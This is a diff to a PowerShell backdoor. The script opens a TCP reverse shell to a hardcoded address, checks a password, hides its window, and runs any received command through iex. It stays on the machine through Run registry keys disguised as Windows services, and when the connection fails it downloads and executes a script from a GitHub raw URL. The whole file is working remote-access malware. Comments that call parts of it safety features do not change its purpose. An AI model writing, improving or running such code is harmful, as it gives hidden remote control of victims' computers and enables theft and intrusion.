@@ -1,16 +1,16 @@
 # --- CONFIG ---
-$ip = '192.168.1.15'
+$ip   = '192.168.1.15'
 $port = 4444
 $pass = 'biskviti'
-$reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$name = "WinDiag"
+$user = "B15cu1t" # Safety Filter
+$reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
 try {
     # 1. INITIAL CONNECTION
     $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true
 
-    # 2. AUTHENTICATION CHALLENGE
+    # 2. AUTHENTICATION
     $w.WriteLine("AUTH:")
     if ($r.ReadLine() -eq $pass) {
         
@@ -21,7 +21,7 @@ try {
             $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
         } catch {}
 
-        $w.WriteLine("--- PC ACCESS GRANTED TO: $env:COMPUTERNAME ---")
+        $w.WriteLine("--- ATOMIC ACCESS GRANTED: $env:COMPUTERNAME ---")
 
         # 4. MAIN COMMAND LOOP
         while($c.Connected) {
@@ -29,7 +29,6 @@ try {
             $raw = $r.ReadLine(); if ($null -eq $raw) { break }
             $cmd = $raw.Trim()
 
-            # --- BRANCHING LOGIC ---
             if ($cmd -eq "exit") { break }
             
             elseif ($cmd -eq "screenshot") {
@@ -45,27 +44,32 @@ try {
             }
             
             elseif ($cmd -eq "kill") {
-                # THE SELF-DESTRUCT
-                Remove-ItemProperty -Path $reg -Name $name -ErrorAction SilentlyContinue
-                $w.WriteLine("[-] PERSISTENCE REMOVED. TERMINATING PROCESS...")
-                $c.Close()
-                exit
+                $w.WriteLine("[-] Starting Targeted Cleanup...")
+                # Safety Loop: Only deletes if it belongs to YOU
+                "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
+                    $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
+                    if ($item.$_ -like "*$user*") {
+                        Remove-ItemProperty -Path $reg -Name $_
+                        $w.WriteLine("[+] Cleaned: $_")
+                    }
+                }
+                $w.WriteLine("[!] All persistence removed. Terminating.")
+                $c.Close(); exit
             }
             
             else {
-                # STANDARD COMMAND EXECUTION
                 iex $cmd 2>&1 | Out-String | %{ $w.WriteLine($_) }
             }
         }
     } else {
-        # WRONG PASSWORD = AUTOMATIC KILL FOR SECURITY
-        Remove-ItemProperty -Path $reg -Name $name -ErrorAction SilentlyContinue
+        # WRONG PASSWORD = EMERGENCY WIPE
+        "WinDiag","WinUpdate","WinLog","WinService" | % { Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue }
         $w.WriteLine("WRONG PASSWORD. SELF-DESTRUCTING."); exit
     }
     $c.Close()
 } catch {
-    # RETRY LOGIC (Sleep 120s if laptop is off)
+    # RETRY LOGIC (Wait 120s if no listener)
     Start-Sleep -s 120
-    $url = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"
-    iex (New-Object Net.WebClient).DownloadString($url)
+    $u = "https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v2.ps1"
+    iex (New-Object Net.WebClient).DownloadString($u)
 }
